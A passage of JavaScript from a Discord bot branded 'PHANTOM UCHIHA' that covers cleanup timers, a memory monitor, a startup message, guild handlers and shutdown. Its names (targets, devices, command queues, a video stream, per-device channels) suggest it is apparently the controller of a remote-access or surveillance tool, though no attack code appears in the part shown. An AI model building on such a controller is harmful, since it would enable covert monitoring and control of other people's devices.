    } catch (_) {}
    finally { running = false }
  }
  runCheck()
  statusCheckerId = setInterval(runCheck, STATUS_CHECK_INTERVAL)
}

// ── Map cleanup (memory leak fix) ─────────────────────────────────────────

function cleanupMaps() {
  const now = Date.now()
  const toDeleteTargets = []
  for (const [uid, data] of targets) {
    const chId = typeof data === 'string' ? data : data.chId
    const ts = typeof data === 'object' ? data.ts : now
    if (!chId || now - ts > 3600000) toDeleteTargets.push(uid)
    else if (client.channels.cache.size > 0 && !client.channels.cache.has(chId)) toDeleteTargets.push(uid)
  }
  for (const uid of toDeleteTargets) targets.delete(uid)

  const toDeleteStatus = []
  for (const [chId, st] of deviceStatus) {
    if (!client.channels.cache.has(chId) && st.lastSeen && now - st.lastSeen > 3600000) toDeleteStatus.push(chId)
  }
  for (const chId of toDeleteStatus) deviceStatus.delete(chId)
  for (const [id, page] of devicePages) {
    if (now - page.ts > PAGINATION_TIMEOUT) devicePages.delete(id)
  }
  for (const [uid, data] of rateLimits) {
    if (now - data.ts > RATE_LIMIT_WINDOW) rateLimits.delete(uid)
  }
  for (const [uid, cd] of commandCooldowns) {
    if (now - cd > COMMAND_COOLDOWN * 2) commandCooldowns.delete(uid)
  }
  for (const [uid, log] of commandLog) {
    if (log.length > COMMAND_LOG_MAX) commandLog.set(uid, log.slice(-COMMAND_LOG_MAX))
  }
  for (const [key, ac] of alertCooldown) {
    if (now - ac > 600000) alertCooldown.delete(key)
  }
}

function cleanupMapsInterval() {
  cleanupIntervalId = setInterval(cleanupMaps, MAP_CLEANUP_INTERVAL)
  setInterval(cleanupCommandState, 300000)
}

function cleanupCommandState() {
  const now = Date.now()
  for (const [id, data] of activeCommands) {
    if (now - data.sent > 600000) activeCommands.delete(id)
  }
  for (const [key, ts] of sentCommands) {
    if (now - ts > COMMAND_DEDUP_WINDOW) sentCommands.delete(key)
  }
  for (const [uid, ts] of commandCooldowns) {
    if (now - ts > 60000) commandCooldowns.delete(uid)
  }
  console.log(`[Cleanup] activeCommands=${activeCommands.size} sentCommands=${sentCommands.size} cooldowns=${commandCooldowns.size}`)
}

// ── Startup ─────────────────────────────────────────────────────────────────

client.once(Events.ClientReady, async () => {
  console.log(`[+] ${client.user.tag} online`)

  // Initialize video stream manager
  videoStream.client = client
  videoStream.startServer()
  console.log('[+] Video stream manager initialized')

  // ── Memory Monitor ───────────────────────────────────────────────────────
  setInterval(() => {
    const mem = process.memoryUsage()
    console.log(`[MEM] RSS: ${(mem.rss / 1024 / 1024).toFixed(1)}MB | Heap: ${(mem.heapUsed / 1024 / 1024).toFixed(1)}MB | Maps: targets=${targets.size} status=${deviceStatus.size} pages=${devicePages.size}`)
  }, 1800000)

  // ── Bot Profile Setup ───────────────────────────────────────────────────────
  try {
    await client.user.setUsername('PHANTOM UCHIHA').catch(() => {})
    client.user.setActivity('👁️ Watching 0 devices | !help', { type: 3 })
    console.log('[+] Bot profile updated: username, activity')
  } catch (e) {
    console.log('[!] Could not set bot profile:', e.message)
  }

  if (ALLOWED_CHANNEL_ID && !startupMsgSent) {
    startupMsgSent = true
    const ch = await client.channels.fetch(ALLOWED_CHANNEL_ID).catch(() => null)
    if (!ch) {
      console.error(`[!] ALLOWED_CHANNEL_ID ${ALLOWED_CHANNEL_ID} not found or inaccessible`)
    } else {
      const lines = [
        `**${E.sharingan} PHANTOM UCHIHA v3.0**`,
        `Gateway: Discord WebSocket`,
        `Status: ${E.flame} ACTIVE`,
        `Online: ${ts()}`,
        '',
        `Awaiting commands...`,
      ]
      const e = new EmbedBuilder()
        .setColor(C.sharingan)
        .setTitle(`${E.sharingan} ${bold('PHANTOM UCHIHA')}`)
        .setDescription(lines.join('\n'))
        .setThumbnail(randGif())
        .setImage(randGif())
        .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.footer || undefined })
      await ch.send({ embeds: [e], components: MENU_BTNS }).catch(err => console.error('Startup:', err.message))
    }
  } else if (!ALLOWED_CHANNEL_ID) {
    console.log('[!] ALLOWED_CHANNEL_ID not set — bot responds in all channels')
  }

  for (const [, guild] of client.guilds.cache) {
    startStatusChecker(guild)
    await registerSlashCommands(guild)
    console.log(`[+] Status checker started for guild: ${guild.name}`)
  }
})

client.on(Events.GuildCreate, async (guild) => {
  startStatusChecker(guild)
  await registerSlashCommands(guild)
  console.log(`[+] Joined guild: ${guild.name} — status checker started`)
})

client.on(Events.GuildDelete, (guild) => {
  if (statusCheckerId) {
    clearInterval(statusCheckerId)
    statusCheckerId = null
  }
  for (const [, ch] of guild.channels.cache) {
    if (ch.name.startsWith('phantom-')) {
      deviceStatus.delete(ch.id)
      targets.forEach((data, uid) => {
        const chId = typeof data === 'object' ? data.chId : data
        if (chId === ch.id) targets.delete(uid)
      })
    }
  }
  console.log(`[-] Left guild: ${guild.name} — cleaned up channels`)
})

// ── Graceful shutdown ──────────────────────────────────────────────────────

function shutdown() {
  console.log('[*] Shutting down...')
  if (statusCheckerId) clearInterval(statusCheckerId)
  if (cleanupIntervalId) clearInterval(cleanupIntervalId)
  client.destroy()
  process.exit(0)
}

process.on('SIGINT', shutdown)
process.on('SIGTERM', shutdown)
process.on('exit', () => {
  if (statusCheckerId) clearInterval(statusCheckerId)
  if (cleanupIntervalId) clearInterval(cleanupIntervalId)
})

cleanupMapsInterval()

client.login(DISCORD_TOKEN).catch(err => { console.error('Login failed:', err.message); process.exit(1) })
